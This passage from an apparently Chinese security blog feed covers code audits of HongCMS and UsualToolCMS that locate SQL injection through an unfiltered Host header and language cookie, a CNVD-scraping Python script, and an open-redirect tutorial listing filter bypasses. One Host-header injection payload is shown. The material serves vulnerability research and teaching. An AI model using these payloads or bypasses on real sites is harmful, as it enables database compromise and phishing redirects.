login,and catch the package.Modify the Host value to <code>&#39;,nickname=user(),lastip =&#39;</code>Add X-Forwarded-For and it’s value is <code>a</code>,then we put the package.</p><p><img src="/2019/04/05/hongcms/3.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;Because there is no filtering of the Host header, there are at least two SQL injections.&lt;/font&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>HongCMS 代码审计</title>
    <link href="http://yoursite.com/2019/04/05/hongcms4.0/"/>
    <id>http://yoursite.com/2019/04/05/hongcms4.0/</id>
    <published>2019-04-04T16:00:00.000Z</published>
    <updated>2019-04-05T08:12:33.409Z</updated>
    
    <content type="html"><![CDATA[<font color="green">挺不错的一个CMS，防护做的很好，某些细节上的问题导致了漏洞</font><a id="more"></a><h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a><font color="dark">背景介绍</font></h3><p><strong>HongCMS是一个轻量级的中英文企业网站系统，访问速度极快，使用简单，程序代码简洁严谨，功能强大，完全免费开源，可用于建设各种类型的中英文网站，同时它是一个小型开发框架。</strong></p><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a><font color="dark">审计过程</font></h3><p>先看下入口文件index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(ROOT . <span class="string">'includes/core.php'</span>);  <span class="comment">//加载核心文件</span></span><br><span class="line">APP::run();</span><br></pre></td></tr></table></figure></p><p><strong>core.php</strong>里定义了一些常量，并且连接了数据库，app的run方法则是框架的主方法，定义了如何加载文件<br>对于输入处理有两个方法，ForceStringFrom以及ForceIntFrom<br>首先看下ForceIntFrom<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ForceIntFrom</span><span class="params">($VariableName, $DefaultValue = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[$VariableName])) &#123;</span><br><span class="line"><span class="keyword">return</span> ForceInt($_GET[$VariableName], $DefaultValue);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[$VariableName])) &#123;</span><br><span class="line"><span class="keyword">return</span> ForceInt($_POST[$VariableName], $DefaultValue);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> $DefaultValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果<code>$VariableName</code>是通过GET或者POST获取到的则送入ForceInt函数处理，否则返回默认值<br>看下ForceInt<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ForceInt</span><span class="params">($InValue, $DefaultValue = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$iReturn = intval($InValue);</span><br><span class="line"><span class="keyword">return</span> ($iReturn == <span class="number">0</span>) ? $DefaultValue : $iReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>intval返回的是一个整数，所以被ForceIntFrom处理过的参数不存在注入，再来看下ForceStringFrom，是将ForceIntForm的ForceInt改为了ForceString，直接看ForceString<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ForceString</span><span class="params">($InValue, $DefaultValue = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_string($InValue)) &#123;</span><br><span class="line">$sReturn = EscapeSql(trim($InValue));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($sReturn) &amp;&amp; strlen($sReturn) == <span class="number">0</span>) $sReturn = $DefaultValue;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$sReturn = EscapeSql($DefaultValue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $sReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>EscapeSql中最后是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query_string = addslashes($query_string);</span><br></pre></td></tr></table></figure></p><p>看来这个也没有希望了，看下别的。<br>发现GetIP函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">'HTTP_CLIENT_IP'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_CLIENT_IP'</span>), <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">$thisip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>), <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">$thisip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(getenv(<span class="string">'REMOTE_ADDR'</span>) &amp;&amp; strcasecmp(getenv(<span class="string">'REMOTE_ADDR'</span>), <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">$thisip = getenv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">'unknown'</span>)) &#123;</span><br><span class="line">$thisip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">"/[\d\.]&#123;7,15&#125;/"</span>, $thisip, $thisips);</span><br><span class="line">$thisip = $thisips[<span class="number">0</span>] ? $thisips[<span class="number">0</span>] : gethostbyname($_SERVER[<span class="string">'HTTP_HOST'</span>]);</span><br><span class="line"><span class="keyword">return</span> $thisip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意最后的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$thisip = $thisips[<span class="number">0</span>] ? $thisips[<span class="number">0</span>] : gethostbyname($_SERVER[<span class="string">'HTTP_HOST'</span>]);</span><br></pre></td></tr></table></figure></p><p>这里的gethostbyname</p><blockquote><p>​         成功时返回 IPv4 地址，失败时原封不动返回 <code>hostname</code> 字符串。 </p></blockquote><p>只要gethostbyname失败，我们就可以使GetIP得到的返回值可控！<br>怎么样使它失败呢，很简单，只要Host不是一个可用地址就可以，也就是说如果我们填入SQL语句，它是肯定会失败的，之后会将我们的SQL语句返回<br>全局搜索下GetIP<br>在register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP::$DB-&gt;exe(<span class="string">"INSERT INTO "</span> . TABLE_PREFIX . <span class="string">"user (groupid, activated, username, password, verifycode, joindate, joinip, lang, nickname, email) VALUES ($groupid, $activated, '$username', '"</span>.md5($password).<span class="string">"', '$verifycode', '"</span>.time().<span class="string">"', '"</span>.GetIP().<span class="string">"', $lang, '$nickname', '$email')"</span>);</span><br></pre></td></tr></table></figure></p><p>没做任何过滤，利用起来就简单了<br>还有别的就不再写出来了<br>漏洞利用:<a href="http://noel.xin/2019/04/05/hongcms/" target="_blank" rel="noopener">http://noel.xin/2019/04/05/hongcms/</a></p><blockquote><p>你来的话，日子会甜一点。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;挺不错的一个CMS，防护做的很好，某些细节上的问题导致了漏洞&lt;/font&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>UsualToolCMS</title>
    <link href="http://yoursite.com/2019/04/03/UsualToolCMS/"/>
    <id>http://yoursite.com/2019/04/03/UsualToolCMS/</id>
    <published>2019-04-02T16:00:00.000Z</published>
    <updated>2019-04-03T05:45:47.329Z</updated>
    
    <content type="html"><![CDATA[<font color="green">挺简单一款CMS</font><a id="more"></a><h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a><font color="dark">前台SQL注入</font></h3><p>search.php</p><p>直接看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$key=UsualToolCMS::sqlcheck($_GET[<span class="string">"key"</span>]);</span><br><span class="line">$navname=<span class="string">"search"</span>;</span><br><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="string">'mytop.php'</span>);</span><br><span class="line"><span class="comment">//搜索记录</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($key)):</span><br><span class="line">$asql=<span class="string">"SELECT * FROM `cms_search` WHERE keyword ='$key'"</span>;</span><br><span class="line">$adata=mysqli_query($mysqli,$asql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($adata)&gt;<span class="number">0</span>):</span><br><span class="line">$mysqli-&gt;query(<span class="string">"UPDATE `cms_search` SET `hit`=hit+1 WHERE keyword ='$key' and lang='$language'"</span>);</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">$mysqli-&gt;query(<span class="string">"INSERT INTO `cms_search` (`lang`,`keyword`) VALUES ('$language','$key')"</span>);</span><br></pre></td></tr></table></figure><p>$key被sqlcheck函数过滤了，让我们看下这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlchecks</span><span class="params">($StrPost)</span></span>&#123;</span><br><span class="line">$StrPost=str_replace(<span class="string">"'"</span>,<span class="string">"’"</span>,$StrPost);</span><br><span class="line">$StrPost=str_replace(<span class="string">'"'</span>,<span class="string">'“'</span>,$StrPost);</span><br><span class="line">$StrPost=str_replace(<span class="string">"("</span>,<span class="string">"（"</span>,$StrPost);</span><br><span class="line">$StrPost=str_replace(<span class="string">")"</span>,<span class="string">"）"</span>,$StrPost);</span><br><span class="line">$StrPost=str_replace(<span class="string">"@"</span>,<span class="string">"#"</span>,$StrPost);</span><br><span class="line">$StrPost=str_replace(<span class="string">"/*"</span>,<span class="string">""</span>,$StrPost);</span><br><span class="line">$StrPost=str_replace(<span class="string">"*/"</span>,<span class="string">""</span>,$StrPost);</span><br><span class="line"><span class="keyword">return</span> $StrPost;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有Url编码的话这里应该是不存在漏洞的了，仔细看上面的代码，数据库操作中还有一个$language,我们追踪下$language吧</p><p>全局查找，直接找到其定义的地方</p><p>conn.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_COOKIE[<span class="string">'UTCMSLanguage'</span>])):$language=$_COOKIE[<span class="string">'UTCMSLanguage'</span>];<span class="keyword">else</span>:$language=$indexlanguage;<span class="keyword">endif</span>;</span><br></pre></td></tr></table></figure><p>$language没有经过任何过滤就从Cookie传了进来</p><p>这就简单咯</p><p><img src="/2019/04/03/UsualToolCMS/sql1.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;挺简单一款CMS&lt;/font&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CNVD漏洞检测</title>
    <link href="http://yoursite.com/2019/04/01/CNVD/"/>
    <id>http://yoursite.com/2019/04/01/CNVD/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T11:26:02.711Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">使用Python获取CNVD漏洞信息，与Redis相结合，用于储存信息，每次运行检测是否有新的漏洞产生，有的话进行提醒</font><br><a id="more"></a></p><h3 id="4-1"><a href="#4-1" class="headerlink" title="4/1"></a>4/1</h3><p>简单的将Python与Redis进行结合做出来的第一个版本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#constant</span></span><br><span class="line">HOST = <span class="string">'localhost'</span></span><br><span class="line">PORT = <span class="number">6379</span></span><br><span class="line">PWD  = <span class="string">''</span></span><br><span class="line">URL = <span class="string">"http://www.cnvd.org.cn/flaw/list.htm?flag=true"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">' Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'</span></span><br><span class="line">&#125;</span><br><span class="line">Data = &#123;<span class="string">'max'</span>:<span class="number">20</span>,<span class="string">'offset'</span>:<span class="number">0</span>&#125;</span><br><span class="line">R = redis.Redis(host=HOST,port=PORT,password=PWD)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(URL,data=Data,headers=headers)</span><br><span class="line">text = bytes.decode(res.content)</span><br><span class="line"></span><br><span class="line">infos = re.findall(<span class="string">'&lt;/img&gt; &lt;a\s.+href="/flaw/show/(.*?)"?\s+title="(.*?)"&gt;'</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> infos:</span><br><span class="line">    info = i[<span class="number">0</span>]+<span class="string">','</span>+i[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> R.sadd(<span class="string">'CNVD'</span>,info):</span><br><span class="line">        print(<span class="string">'[*]New Info:'</span>,info)</span><br></pre></td></tr></table></figure></p><p>PS:使用集合可能不是那么明智的选择</p><h3 id="4-1-1"><a href="#4-1-1" class="headerlink" title="4/1"></a>4/1</h3><p>更新代码，采用json保存用户信息，同时增加保存成文件的功能<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#import user info</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    UserInfo = json.load(open(<span class="string">'userinfo.json'</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'[-]Load Json File Error!'</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#use redis</span></span><br><span class="line">r = redis.Redis(host=UserInfo[<span class="string">'Host'</span>],port=UserInfo[<span class="string">'Port'</span>],password=UserInfo[<span class="string">'Pwd'</span>])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    acount = r.scard(<span class="string">'CNVD'</span>)</span><br><span class="line">    print(<span class="string">'[+]目前漏洞数为:'</span>,acount)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'[-]Redis'</span>,e)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scanCNVD</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.post(UserInfo[<span class="string">'Url'</span>],data=UserInfo[<span class="string">'Data'</span>],headers=UserInfo[<span class="string">'Headers'</span>])</span><br><span class="line">    text = bytes.decode(res.content)</span><br><span class="line">    infos = re.findall(<span class="string">'&lt;/img&gt; &lt;a\s.+href="/flaw/show/(.*?)"?\s+title="(.*?)"&gt;'</span>,text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> infos:</span><br><span class="line">        info = i[<span class="number">0</span>]+<span class="string">','</span>+i[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> r.sadd(<span class="string">'CNVD'</span>,info):</span><br><span class="line">            print(<span class="string">'[*]New Info:'</span>,info)</span><br><span class="line">    print(<span class="string">'[*]Scan Finish.'</span>)</span><br><span class="line">    r.save()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span><span class="params">()</span>:</span></span><br><span class="line">    cont = [bytes.decode(i) <span class="keyword">for</span> i <span class="keyword">in</span> r.smembers(<span class="string">'CNVD'</span>)]</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="string">'CNVD.csv'</span>):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CNVD.csv'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> af:</span><br><span class="line">            af.write(<span class="string">'\n'</span>.join(cont))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CNVD.csv'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">            wf.write(<span class="string">'编号,内容\n'</span>+<span class="string">'\n'</span>.join(cont))</span><br><span class="line">    print(<span class="string">'[+]Save In CNVD.csv.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">"CNVD INFO."</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'--update'</span>,<span class="string">'-u'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'Update CNVD INFO'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'--file'</span>,<span class="string">'-f'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'Save CNVD INFO'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        parse.print_help()</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        writeFile()</span><br><span class="line">    <span class="keyword">if</span> args.update:</span><br><span class="line">        scanCNVD()</span><br></pre></td></tr></table></figure></p><p>json<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"Host"</span>:<span class="string">"localhost"</span>,</span><br><span class="line"><span class="attr">"Port"</span>: <span class="number">6379</span>,</span><br><span class="line"><span class="attr">"Pwd"</span> :<span class="string">""</span>,</span><br><span class="line"><span class="attr">"Url"</span> :<span class="string">"http://www.cnvd.org.cn/flaw/list.htm?flag=true"</span>,</span><br><span class="line"><span class="attr">"Data"</span>:&#123;<span class="attr">"max"</span>:<span class="number">20</span>,<span class="attr">"offset"</span>:<span class="number">0</span>&#125;,</span><br><span class="line"><span class="attr">"Headers"</span>:&#123;<span class="attr">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0"</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p>已上传至Github<br><a href="https://github.com/No4l/MyTools/tree/master/CNVD" target="_blank" rel="noopener">https://github.com/No4l/MyTools/tree/master/CNVD</a></p><blockquote><p>海底月是天上月，眼前人是心上人。向来心是看客心，奈何人是剧中人。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;使用Python获取CNVD漏洞信息，与Redis相结合，用于储存信息，每次运行检测是否有新的漏洞产生，有的话进行提醒&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Url Redirect</title>
    <link href="http://yoursite.com/2019/03/31/URLRedirect/"/>
    <id>http://yoursite.com/2019/03/31/URLRedirect/</id>
    <published>2019-03-30T16:00:00.000Z</published>
    <updated>2019-03-31T04:44:17.380Z</updated>
    
    <content type="html"><![CDATA[<font color="green">URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式</font><br><a id="more"></a><br><br><br><br><br>### <font color="dark">成因</font><p>常见方式</p><ul><li>META标签的refresh</li><li>Javascript</li><li>header</li></ul><p>meta</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=url"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Javascript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"url"</span>;</span><br></pre></td></tr></table></figure><p>header</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Location:url"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当上述栗子中的url未限制时就产生了URL重定向/跳转漏洞</p><h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a><font color="dark">发现</font></h3><ul><li><p>在退出处常见URL跳转</p><p><img src="/2019/03/31/URLRedirect/1.jpg" alt></p></li><li><p>利用burp的search，搜索=http 同时返回包为302的内容</p><p><img src="/2019/03/31/URLRedirect/3.png" alt></p><p>发包到repeater,略作修改</p><p><img src="/2019/03/31/URLRedirect/4.png" alt></p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><font color="dark">绕过</font></h3><p>一般来说URL跳转发现比较容易，但是利用起来比较难，因为许多会做一些防护</p><p>1.xip.io绕过</p><p><img src="/2019/03/31/URLRedirect/5.jpg" alt></p><p>这里只要不是www就会强制返回到<a href="https://xue.xx.com/login" target="_blank" rel="noopener">https://xue.xx.com/login</a></p><p>但是利用<a href="https://xue.xx.com.*.xip.io" target="_blank" rel="noopener">https://xue.xx.com.*.xip.io</a></p><p><img src="/2019/03/31/URLRedirect/6.jpg" alt></p><p>2.使用@绕过</p><p>这里并不能采用xip.io的方式绕过</p><p><img src="/2019/03/31/URLRedirect/8.jpg" alt></p><p>可以使用@但是如果@后的域名不在规定范围内同样不可跳转</p><p><img src="/2019/03/31/URLRedirect/9.jpg" alt></p><p>这个时候可以在@前加上/，\或者?尝试下</p><p><img src="/2019/03/31/URLRedirect/10.jpg" alt></p><p>3.http://后加反斜杠绕过</p><p>有些时候@和.xip.io都不能使</p><p><img src="/2019/03/31/URLRedirect/11.jpg" alt></p><p>这个时候可以采用http://\的样式尝试绕过</p><p><img src="/2019/03/31/URLRedirect/12.jpg" alt></p><p>4.某些加密</p><p><a href="http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT" target="_blank" rel="noopener">http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT</a></p><p>这个链接会跳转到<a href="http://www.xilu.com/zhuanti_176871.html" target="_blank" rel="noopener">http://www.xilu.com/zhuanti_176871.html</a></p><p>将 <strong>l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT</strong> base64解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x97\x8b\x8b\x8f\xc5\xd0\xd0\x88\x88\x88\xd1\x87\x96\x93\x8a\xd1\x9c\x90\x92\xd0\x85\x97\x8a\x9e\x91\x8b\x96\xa0\xce\xc8\xc9\xc7\xc8\xce\xd1\x97\x8b\x92\x93</span><br></pre></td></tr></table></figure><p>推测与跳转的链接一一对应，推测出对应关系表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;a&apos;:&apos;9e&apos;, &apos;b&apos;:&apos;9d&apos;, &apos;c&apos;:&apos;9c&apos;, &apos;d&apos;:&apos;9b&apos;, &apos;e&apos;:&apos;9a&apos;,&apos;f&apos;:&apos;99&apos;, &apos;g&apos;:&apos;98&apos;, &apos;h&apos;:&apos;97&apos;, &apos;i&apos;:&apos;96&apos;, &apos;j&apos;:&apos;95&apos;,</span><br><span class="line"> &apos;k&apos;:&apos;94&apos;, &apos;l&apos;:&apos;93&apos;, &apos;m&apos;:&apos;92&apos;, &apos;n&apos;:&apos;91&apos;, 